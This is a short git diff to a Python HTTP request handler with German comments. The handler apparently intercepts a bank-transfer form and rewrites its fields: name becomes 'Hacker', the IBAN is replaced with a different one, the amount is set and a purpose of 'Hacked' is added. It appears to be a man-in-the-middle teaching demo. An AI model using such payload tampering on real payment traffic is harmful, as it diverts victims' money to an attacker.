@@ -22,8 +22,9 @@ class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
         # payload maniplulieren
         payload[b'name'] = [b'Hacker'] # "b" - String lateral um binäre Daten zu repräsentaieren 
-        payload[b'iban'] = [b'DEManipulatedIBAN']
+        payload[b'iban'] = [b'DE1324567890135792468']
         payload[b'amount'] = [b'499']
+        payload[b'purpose'] = [b'Hacked']
         print(payload) #manipulierte payload
 
         # payload wieder in bytes umwandeln
